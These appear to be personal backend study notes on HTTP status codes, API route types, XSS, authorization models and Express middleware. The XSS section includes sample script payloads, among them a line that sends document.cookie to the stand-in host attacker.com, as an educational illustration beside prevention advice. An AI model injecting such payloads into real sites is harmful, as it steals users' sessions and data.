# HTTP Status Codes & API Route Types

## HTTP Status Codes

HTTP status codes are responses sent by the server to indicate the result of a client's request.

| Code | Name | Meaning | Example |
|-----|-----|-----|-----|
| 200 | OK | Request was successful | Fetching users from database |
| 201 | Created | Resource successfully created | Creating a new user |
| 400 | Bad Request | Client sent an invalid request | Missing required fields |
| 401 | Unauthorized | Authentication required or invalid | No token or wrong token |
| 404 | Not Found | Requested resource does not exist | User ID not found |
| 500 | Internal Server Error | Server-side error | Database failure or server crash |

---

## API Route Types

APIs typically have two types of routes based on **access control**.

| Route Type | Access | Description |
|-----------|--------|-------------|
| Public Routes | Anyone | No authentication required |
| Protected Routes | Authenticated users only | Requires authentication |

---

## Public Routes

Public routes can be accessed by **any user without authentication**.

### Examples

```js
POST /register
POST /login
GET /products
```

### Use Cases

- User registration
- User login
- Viewing public data

---

## Protected Routes

Protected routes require **authentication** before access is granted.

Authentication methods include:

- JWT Tokens
- Session Cookies
- API Keys

### Examples

```js
GET /profile
POST /orders
DELETE /account
```

---

## Authentication Flow Example

```
User logs in
      ↓
Server returns JWT token
      ↓
Client stores token
      ↓
Client sends token in request headers
      ↓
Server verifies token
      ↓
Access granted to protected routes
```

### Example Request

```js
GET /profile
Authorization: Bearer <token>
```

# Cross-Site Scripting (XSS)

## Overview

**Cross-Site Scripting (XSS)** is a web security vulnerability where an attacker injects **malicious scripts** into a trusted website.  
These scripts run in the **victim's browser**, allowing the attacker to steal data, manipulate the page, or impersonate the user.

The attack happens because the application **does not properly validate or sanitize user input**.

---

# How XSS Works

Basic flow:

```
Attacker injects malicious script
        ↓
Application stores or reflects the script
        ↓
Victim loads the webpage
        ↓
Browser executes the malicious script
        ↓
Attacker gains access to user data
```

Example malicious script:

```html
<script>
alert("You are hacked!");
</script>
```

---

# Types of XSS

## 1. Stored XSS (Persistent XSS)

Malicious script is **stored in the server database** and served to users later.

Example:

```
User comments section
```

Attacker submits:

```html
<script>
fetch("https://attacker.com?cookie=" + document.cookie)
</script>
```

When other users open the page, the script executes and sends their cookies to the attacker.

---

## 2. Reflected XSS

The malicious script is **immediately reflected in the response** from the server.

Example URL:

```
https://example.com/search?q=<script>alert("xss")</script>
```

If the server returns the input without sanitizing it, the browser executes the script.

Common locations:

- Search boxes
- URL parameters
- Form inputs

---

## 3. DOM-Based XSS

The vulnerability exists **in client-side JavaScript** instead of the backend.

Example:

```javascript
document.getElementById("output").innerHTML = location.hash;
```

If the URL contains:

```
#<script>alert("xss")</script>
```

The browser executes the injected script.

---

# Impact of XSS

An attacker can:

- Steal session cookies
- Perform actions as the victim
- Modify webpage content
- Redirect users to malicious sites
- Capture sensitive data

Example cookie theft:

```javascript
fetch("https://attacker.com/steal?cookie=" + document.cookie)
```

---

# Preventing XSS

## 1. Input Validation

Validate user inputs before processing them.

Example:

- Reject `<script>` tags
- Restrict allowed characters

---

## 2. Output Escaping

Escape HTML characters before rendering.

Example:

```
<  →  &lt;
>  →  &gt;
```

Instead of rendering:

```html
<script>alert("xss")</script>
```

The browser shows it as plain text.

---

## 3. Use Secure Frameworks

Modern frameworks automatically escape content:

- React
- Angular
- Vue

They prevent direct injection into the DOM.

---

## 4. Content Security Policy (CSP)

CSP restricts which scripts the browser can execute.

Example header:

```
Content-Security-Policy: script-src 'self'
```

This blocks scripts from unknown sources.

---

## 5. Avoid Dangerous DOM APIs

Avoid using:

```javascript
innerHTML
document.write()
eval()
```

Prefer safer alternatives:

```javascript
textContent
createElement()
```

---

# Example of Safe vs Unsafe Code

Unsafe:

```javascript
element.innerHTML = userInput
```

Safe:

```javascript
element.textContent = userInput
```

---

# Quick Summary

| Feature | Description |
|------|------|
| XSS | Injecting malicious scripts into webpages |
| Target | User browser |
| Goal | Steal cookies, sessions, or manipulate pages |
| Main Cause | Improper input validation or output escaping |

---

# Key Idea

XSS works because **web browsers trust scripts from the website they load**.

If an attacker manages to inject their script into that website, the browser treats it as **trusted code**.

That is why sanitizing user input and escaping output is critical in web applications.



# Authorization and Middleware (Backend Notes)

# Authorization

## Overview

**Authorization** is the process of determining **what a user is allowed to do** after they have been authenticated.

Authentication answers:

```
Who are you?
```

Authorization answers:

```
What are you allowed to do?
```

Example:

```
User logs in → Authentication
User tries to delete another user's account → Authorization check
```

---

# Authentication vs Authorization

| Feature | Authentication | Authorization |
|------|------|------|
| Purpose | Verify identity | Check permissions |
| Question | Who are you? | What can you do? |
| Example | Login with email/password | Admin can delete users |
| Happens when | First step | After authentication |

---

# Authorization Example

Suppose a system has two roles:

```
Admin
User
```

Permissions:

| Role | Allowed Actions |
|------|----------------|
| Admin | Create, Read, Update, Delete |
| User | Read only |

Example API request:

```
DELETE /users/123
```

Server checks:

```
Is user role = admin ?
```

If yes:

```
200 OK
```

If not:

```
403 Forbidden
```

---

# Authorization Techniques

## Role-Based Access Control (RBAC)

Access is determined by **roles**.

Example roles:

```
admin
editor
user
```

Example rule:

```
admin → can delete users
user → cannot delete users
```

---

## Permission-Based Access

Instead of roles, permissions are stored individually.

Example:

```
can_read
can_write
can_delete
```

User permissions:

```
{
 "can_read": true,
 "can_delete": false
}
```

---

## Attribute-Based Access Control (ABAC)

Access is decided using multiple attributes such as:

- user role
- location
- time
- resource ownership

Example:

```
User can edit a post only if they are the author
```

---

# Middleware

## Overview

**Middleware** is a function that runs **between the request and the response** in a web server.

It can:

- inspect requests
- modify requests
- stop requests
- pass requests to the next handler

Basic flow:

```
Client Request
      ↓
Middleware
      ↓
Route Handler
      ↓
Response
```

---

# Why Middleware is Used

Middleware is used for common backend tasks:

- Authentication
- Authorization
- Logging
- Error handling
- Rate limiting
- Data validation

---

# Middleware Flow (Example)

```
Request → Auth Middleware → Authorization Middleware → Controller → Response
```

Steps:

```
1. User sends request
2. Authentication middleware verifies token
3. Authorization middleware checks permissions
4. Controller processes request
5. Response returned
```

---

# Middleware Example (Express.js Concept)

Example middleware:

```javascript
function authMiddleware(req, res, next) {
    const token = req.headers.authorization

    if (!token) {
        return res.status(401).json({ message: "Unauthorized" })
    }

    next()
}
```

Explanation:

```
Request comes in
Check for token
If token missing → stop request
If token exists → move to next function
```

---

# Authorization Middleware Example

```javascript
function adminOnly(req, res, next) {
    if (req.user.role !== "admin") {
        return res.status(403).json({ message: "Forbidden" })
    }

    next()
}
```

---

# Middleware Chain Example

```
app.get(
  "/delete-user",
  authMiddleware,
  adminOnly,
  deleteUserController
)
```

Execution order:

```
1. authMiddleware
2. adminOnly
3. deleteUserController
```

---

# Types of Middleware

| Type | Purpose |
|------|------|
| Authentication Middleware | Verify user identity |
| Authorization Middleware | Check permissions |
| Logging Middleware | Log requests |
| Error Middleware | Handle server errors |
| Validation Middleware | Validate request data |

---

# Common HTTP Status Codes in Auth Systems

| Code | Meaning |
|------|------|
| 401 | Unauthorized (not logged in) |
| 403 | Forbidden (no permission) |

Example:

```
401 → User not authenticated
403 → User authenticated but lacks permission
```

---

# Summary

Authorization ensures **users can only perform actions they are permitted to perform**.

Middleware helps organize backend logic by **processing requests before they reach the main route handler**.

Typical backend request pipeline:

```
Request
  ↓
Authentication Middleware
  ↓
Authorization Middleware
  ↓
Route Controller
  ↓
Response
```